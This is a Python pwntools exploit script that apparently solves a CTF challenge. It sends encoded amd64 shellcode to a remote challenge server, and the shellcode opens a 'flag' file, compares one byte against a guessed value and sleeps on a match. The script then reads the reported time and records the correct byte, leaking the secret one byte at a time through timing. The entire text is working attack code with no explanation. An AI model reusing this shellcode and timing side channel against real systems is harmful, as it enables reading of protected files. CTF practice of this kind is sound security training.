from pwn import *
from time import time


context.clear(arch='amd64',os='linux')
run_local = False
r=remote("bin2.ctf.offdef.it",4001)



value=int(sys.argv[1]).to_bytes(1,"little")
index_val=bytes(sys.argv[2],'ascii')
print("value")
print(index_val)
print("index")
print(value)
shellcode=b"\x31\xF6\xB8\x02\x00\x00\x00\x48\xC7\xC3\x66\x6C\x61\x67\x53\x48\x89\xE7\x0F\x05\xBA\xFF\x00\x00\x00\x48\x89\xC7\x31\xC0\x48\x89\xE6\x0F\x05\x48\x31\xFF\x48\x83\xC6"+value+b"\x40\x8A\xBE\x00\x00\x00\x00\x40\x80\xFF"+index_val+b"\x0F\x85\x00\x00\x00\x00\xB8\x23\x00\x00\x00\x48\x89\xE7\x48\xC7\xC6\x00\x00\x00\x00\x4D\x31\xD2\x41\x52\x48\xC7\xC7\x01\x00\x00\x00\x57\x0F\x05\x90"


shellcode = pwnlib.encoders.encoder.alphanumeric(shellcode) #for some reason if i don't do this its broken 
shellcode=shellcode.ljust(1024,b"A")

r.recvuntil(b"Shellcode:")

r.sendline(shellcode)
r.recvuntil(b"Time: ")
time=r.recv(4)
r.close()
hello =time.decode("ascii")
print(hello)
if(float(hello)>1):
	print(str(value))
	f = open("flag", "a")
	f.write(str(value))
	f.close()	
